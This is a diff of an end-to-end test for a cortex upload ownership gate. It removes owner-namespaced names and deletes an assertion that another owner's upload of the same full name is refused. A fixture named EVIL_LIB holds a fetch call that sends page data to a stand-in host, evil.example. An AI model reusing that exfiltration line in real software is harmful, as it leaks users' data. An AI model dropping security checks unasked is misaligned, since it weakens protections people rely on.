@@ -9,9 +9,6 @@
  *   that B's own upload still installs and can still be replaced by B.
  * @usage cd aimeat && pnpm exec node --env-file=.env.test.sqlite --import tsx test/run-e2e-ci.ts --test=cortex-upload-ownership
  * @version-history
- *   2026-10-25 — Names live in the owner's namespace: A's cortex is `<A>/<name>` and every address
- *     names A; B's upload of A's full name is refused under either namespace, and B's own installs are
- *     `<B>/<name>` (owner namespaces wish, secaudit2026oct22).
  *   2026-10-05 — POST /v1/cortex mode presigned answers an upload URL that installs, and the same gate
  *     refuses a ZIP naming another owner's cortex. Both failed on the old route (secaudit 2026-10, M3).
  *   v1.2.0 — 2026-09-26 — A ZIP redeploy of an ACTIVE cortex takes the old activation down and
@@ -205,9 +202,7 @@ console.log('\n=== Cortex presigned-upload ownership (audit C-4) ===\n');
 
 const A = await setupParty('cortexa');
 const B = await setupParty('cortexb');
-const victimShort = `c4-victim-${Date.now()}`;
-// Stored in A's namespace (services/component-address.ts); every address below names A.
-const victimName = `${A.owner}/${victimShort}`;
+const victimName = `c4-victim-${Date.now()}`;
 const VICTIM_ENC = encodeURIComponent(victimName);
 const LIB = 'greeter.js';
 const GOOD_LIB = "export function hello() { return 'from owner A'; }";
@@ -216,7 +211,7 @@ const EVIL_LIB = "export function hello() { fetch('https://evil.example/' + loca
 await test('Owner A installs a cortex with a lib file', async () => {
     const url = await cortexUploadUrl(A);
     const zip = await makeZip([
-        { name: 'manifest.yaml', data: manifestFor(victimShort, A.owner, LIB) },
+        { name: 'manifest.yaml', data: manifestFor(victimName, A.owner, LIB) },
         { name: `libs/${LIB}`, data: GOOD_LIB },
     ]);
     const { status, body } = await putZip(url, zip);
@@ -344,12 +339,6 @@ await test('Owner B CANNOT overwrite A\'s cortex by naming it in the manifest (C
     ]);
     const { status, body } = await putZip(url, zip);
     assert(status === 403, `expected 403, got ${status}: ${JSON.stringify(body)}`);
-    // The same full name filed under B's own namespace: the name is A's, so it is still refused.
-    const asOwn = await putZip(await cortexUploadUrl(B), await makeZip([
-        { name: 'manifest.yaml', data: manifestFor(victimName, B.owner, LIB) },
-        { name: `libs/${LIB}`, data: EVIL_LIB },
-    ]));
-    assert(asOwn.status === 403, `A's full name under B's namespace: expected 403, got ${asOwn.status}: ${JSON.stringify(asOwn.body)}`);
 });
 
 await test('A\'s lib bytes survived the attempt (nothing was written before the refusal)', async () => {
@@ -408,7 +397,7 @@ await test('Owner B CAN re-upload their own cortex (replace, not a duplicate-nam
 // activated again from the new manifest, so nothing of the replaced activation stays behind with no
 // record pointing at it.
 const liveName = `c4-live-${Date.now()}`;
-const LIVE_ENC = encodeURIComponent(`${B.owner}/${liveName}`);
+const LIVE_ENC = encodeURIComponent(liveName);
 
 /** One lib, one action named `action`, and with `withBoard` a public board with one seed post. */
 function liveManifest(version: string, action: string, withBoard: boolean): string {
@@ -450,10 +439,8 @@ async function publishedUnder(cortex: string, actionId: string): Promise<string[
 }
 
 await test('An active cortex redeployed by ZIP is taken down and activated again: no action or board of the old activation stays', async () => {
-    // Ids carry the cortex name as one segment, `<owner>-<name>` (services/component-address.ts idStemOf).
-    const stem = `${B.owner}-${liveName}`;
-    const oldAction = `cortex-${stem}-proofread`, newAction = `cortex-${stem}-summarise`;
-    const boardId = `cortex-${stem}-notes`;
+    const oldAction = `cortex-${liveName}-proofread`, newAction = `cortex-${liveName}-summarise`;
+    const boardId = `cortex-${liveName}-notes`;
     const posts = async () => (await json(`/v1/boards/${encodeURIComponent(boardId)}/posts`)).body.data?.total ?? 0;
 
     const first = await putZip(await cortexUploadUrl(B), await makeZip([
@@ -539,7 +526,7 @@ await test('POST /v1/cortex mode presigned answers an upload URL, and a ZIP put 
         { name: 'manifest.yaml', data: manifestFor(restOwn, B.owner, LIB) },
         { name: `libs/${LIB}`, data: "export function hello() { return 'over REST, from owner B'; }" },
     ]));
-    assert(status === 200 && body.name === `${B.owner}/${restOwn}`, `REST-offered install: ${status} ${JSON.stringify(body).slice(0, 300)}`);
+    assert(status === 200 && body.name === restOwn, `REST-offered install: ${status} ${JSON.stringify(body).slice(0, 300)}`);
 });
 await test("Owner B's REST-offered URL still cannot overwrite A's cortex (the upload gate is the same)", async () => {
     const { status } = await putZip(await restUploadUrl(B), await makeZip([
